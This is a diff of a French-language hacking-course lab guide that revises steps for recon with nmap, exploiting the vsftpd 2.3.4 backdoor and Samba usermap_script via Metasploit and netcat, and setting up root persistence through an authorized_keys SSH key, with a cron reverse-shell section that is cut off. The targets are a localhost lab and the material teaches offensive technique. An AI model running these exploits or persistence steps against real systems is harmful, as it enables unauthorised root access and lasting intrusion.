@@ -110,9 +110,9 @@ nmap --script smb-vuln* -p 445 localhost | tee recon/smb.txt
 
 ### Étape 3 — Script de reconnaissance automatisé
 
-Créez `~/cours-hacking/jour-2/labs/recon.sh` :
-
 ```bash
+cd ~/cours-hacking/jour-2/labs
+cat > recon.sh << 'SCRIPT_EOF'
 #!/bin/bash
 OUTDIR="recon/$(date +%H%M)"
 mkdir -p "$OUTDIR"
@@ -120,9 +120,7 @@ nmap -sV -sC -p 21,22,80,445,3306,5432 localhost -oA "$OUTDIR/ports"
 nmap --script ftp-vsftpd-backdoor -p 21 localhost -oA "$OUTDIR/vsftpd"
 nmap --script smb-vuln* -p 445 localhost -oA "$OUTDIR/smb"
 echo "[+] Résultats dans $OUTDIR/" && ls -la "$OUTDIR/"
-```
-
-```bash
+SCRIPT_EOF
 chmod +x recon.sh && ./recon.sh
 ```
 
@@ -149,6 +147,8 @@ flowchart LR
 
 ### Étape 1 — Exploitation Metasploit
 
+Dans un terminal Kali :
+
 ```bash
 msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS localhost; set RPORT 21; run"
 ```
@@ -170,11 +170,14 @@ Sortie attendue :
 echo -e "user :)\npass x" | nc localhost 21 > /dev/null 2>&1 &
 sleep 2
 nc localhost 6200
-whoami
+# Une fois connecté sur le port 6200, tapez dans la session nc :
+# whoami
 # → root
 ```
 
 ### Étape 3 — Post-exploitation
+
+**Ces commandes s'exécutent DANS le shell root obtenu à l'étape précédente** (session Metasploit ou connexion manuelle), PAS dans votre terminal Kali.
 
 ```bash
 whoami                         # root
@@ -200,10 +203,13 @@ Samba 3.0.20 (CVE-2007-2447) a un `usermap` script vulnérable : les métacaract
 
 ### Étape 1 — Exploitation Samba
 
+Dans un terminal Kali :
+
 ```bash
 msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS localhost; set RPORT 445; run"
 # [*] Command shell session 2 opened
-whoami
+# Dans le shell Metasploit, tapez :
+# whoami
 # → root
 ```
 
@@ -219,12 +225,12 @@ whoami
 
 ### Étape 3 — Persistance (TA0003)
 
-Dans le shell root :
+**Dans le shell root obtenu via l'exploit Samba (Étape 1 ci-dessus)**, exécutez :
 
 ```bash
 # SSH key permanente
 mkdir -p /root/.ssh
-echo "VOTRE_CLE_PUBLIQUE" >> /root/.ssh/authorized_keys
+echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 
 # Cron reverse shell
